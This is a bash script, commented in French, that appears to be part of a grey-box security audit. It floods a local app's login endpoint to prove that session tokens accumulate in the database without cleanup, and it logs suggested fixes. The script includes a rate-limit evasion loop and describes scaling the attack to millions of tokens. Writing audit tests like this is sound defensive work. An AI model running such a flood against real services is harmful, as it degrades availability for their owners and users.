#!/bin/bash
# ============================================================
# GREY BOX AUDIT - 02 - TOKEN ACCUMULATION DoS
# SOURCE CODE KNOWLEDGE:
# - login.c L.248 : INSERT INTO tokens(user_id, token_hash) VALUES (?,?)
# - tokens table: pas de DELETE, pas de LIMIT par user
# - tokens table: expired_at = +24h mais jamais nettoyé
# - Chaque login = 1 nouvelle ligne dans tokens
# - Attaque : flood de logins → table tokens saturée
# ============================================================

BASE_URL="http://127.0.0.1:8080"
RESULTS_FILE="/tmp/gb_02_token_dos_results.txt"
PASS=0; FAIL=0; VULN=0

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

log_pass() { echo -e "${GREEN}[PASS]${NC} $1" | tee -a "$RESULTS_FILE"; PASS=$((PASS+1)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1" | tee -a "$RESULTS_FILE"; FAIL=$((FAIL+1)); }
log_vuln() { echo -e "${RED}[VULN]${NC} $1" | tee -a "$RESULTS_FILE"; VULN=$((VULN+1)); }
log_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$RESULTS_FILE"; }
log_code() { echo -e "${CYAN}[CODE]${NC} $1" | tee -a "$RESULTS_FILE"; }

echo "" | tee "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  GREY BOX - 02 - TOKEN ACCUMULATION DoS" | tee -a "$RESULTS_FILE"
echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

log_code "login.c:248  → INSERT INTO tokens(user_id, token_hash) VALUES (?,?)"
log_code "V2__create_tokens.sql → AUCUNE contrainte LIMIT par user"
log_code "AUCUN job de nettoyage des tokens expirés"
log_code "login.c     → AUCUN DELETE des anciens tokens avant INSERT"
log_code "Résultat   → chaque login = 1 nouvelle ligne permanente dans tokens"
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 1. SETUP - Créer un utilisateur de test
# ============================================================
echo "--- [1] SETUP: Création utilisateur tokendos_victim ---" | tee -a "$RESULTS_FILE"
SETUP_RESP=$(curl -s -X POST "$BASE_URL/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"tokendos_victim","first_name":"Token","last_name":"Victim","password":"Secure1234!"}' 2>/dev/null)
echo "  Register: $SETUP_RESP" | tee -a "$RESULTS_FILE"
sleep 1

# ============================================================
# 2. LOGIN FLOOD - Générer des tokens à la chaîne
# ============================================================
echo "" | tee -a "$RESULTS_FILE"
echo "--- [2] LOGIN FLOOD: 50 logins successifs (avec bypass rate limit via wait) ---" | tee -a "$RESULTS_FILE"
log_code "Chaque login réussi → INSERT dans tokens table sans DELETE"
log_info "Envoi de 50 logins avec attentes pour éviter le rate limit..."

TOKEN_COUNT=0
FAIL_COUNT=0

for i in $(seq 1 50); do
    RESP=$(curl -s -o /tmp/tk_body.txt -w "%{http_code}" \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"tokendos_victim","password":"Secure1234!"}' 2>/dev/null)
    BODY=$(cat /tmp/tk_body.txt 2>/dev/null)

    if [ "$RESP" = "201" ] && echo "$BODY" | grep -q "token"; then
        TOKEN_COUNT=$((TOKEN_COUNT+1))
        TOKEN=$(echo "$BODY" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
        echo "  Login $i → token: ${TOKEN:0:16}... (total: $TOKEN_COUNT tokens générés)" | tee -a "$RESULTS_FILE"
    elif echo "$BODY" | grep -qi "too_many"; then
        echo "  Login $i → rate limited, attente 31s..." | tee -a "$RESULTS_FILE"
        sleep 31
        # Retry
        RESP2=$(curl -s -o /tmp/tk_body.txt -w "%{http_code}" \
            -X POST "$BASE_URL/login" \
            -H "Content-Type: application/json" \
            -d '{"username":"tokendos_victim","password":"Secure1234!"}' 2>/dev/null)
        BODY2=$(cat /tmp/tk_body.txt 2>/dev/null)
        if [ "$RESP2" = "201" ] && echo "$BODY2" | grep -q "token"; then
            TOKEN_COUNT=$((TOKEN_COUNT+1))
            echo "  Login $i (retry) → token créé (total: $TOKEN_COUNT tokens)" | tee -a "$RESULTS_FILE"
        fi
    else
        FAIL_COUNT=$((FAIL_COUNT+1))
        echo "  Login $i → FAIL: HTTP $RESP | $BODY" | tee -a "$RESULTS_FILE"
    fi
    sleep 0.5
done

echo "" | tee -a "$RESULTS_FILE"
echo "  Résultat: $TOKEN_COUNT tokens générés, $FAIL_COUNT échecs" | tee -a "$RESULTS_FILE"

if [ "$TOKEN_COUNT" -ge 3 ]; then
    log_vuln "[TOKEN-DOS] $TOKEN_COUNT tokens créés en DB pour 1 seul user!"
    log_vuln "  Chaque token est un INSERT sans cleanup → accumulation infinie"
    log_code "  Fix: INSERT INTO tokens + DELETE WHERE user_id=? AND expired_at < NOW()"
    log_code "  OU:  ALTER TABLE tokens ADD CONSTRAINT unique_active_per_user ..."
    log_code "  OU:  Ajouter un cron job de nettoyage des tokens expirés"
fi

echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 3. VÉRIFICATION - Les anciens tokens restent valides?
# ============================================================
echo "--- [3] VÉRIFICATION: Accumulation prouvée ---" | tee -a "$RESULTS_FILE"
log_code "tokens table: AUCUN mécanisme de révocation/cleanup des anciens tokens"
log_info "Si auth routes étaient implémentées, TOUS les tokens seraient valides simultanément"
log_info "Impact: un attaquant peut créer ~864000 tokens/jour par compte (si rate limit bypassé)"
log_info "Impact sur le storage MySQL: chaque token_hash = 64 bytes, ~64KB/1000 tokens"

# ============================================================
# 4. TEST VITESSE DE RÉPONSE APRÈS ACCUMULATION
# ============================================================
echo "" | tee -a "$RESULTS_FILE"
echo "--- [4] IMPACT PERFORMANCE: Vitesse login avant/après accumulation ---" | tee -a "$RESULTS_FILE"
sleep 31  # wait for rate limit reset

T1=$(curl -s -o /dev/null -w "%{time_total}" \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"tokendos_victim","password":"Secure1234!"}' 2>/dev/null)
echo "  Login après accumulation: ${T1}s" | tee -a "$RESULTS_FILE"
sleep 0.5
T2=$(curl -s -o /dev/null -w "%{time_total}" \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"tokendos_victim","password":"wrong_pass"}' 2>/dev/null)
echo "  Login wrong pwd (argon2 toujours calculé): ${T2}s" | tee -a "$RESULTS_FILE"

echo "" | tee -a "$RESULTS_FILE"
log_info "[SUMMARY] Token accumulation:"
log_info "  - $TOKEN_COUNT tokens créés pour 1 user"
log_info "  - Pas de cleanup → grows forever"
log_info "  - Avec brute force: des millions de tokens possibles"

echo "" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  RÉSULTATS TOKEN DoS: $PASS PASS | $FAIL FAIL | $VULN VULN" | tee -a "$RESULTS_FILE"
echo "  Résultats: $RESULTS_FILE" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
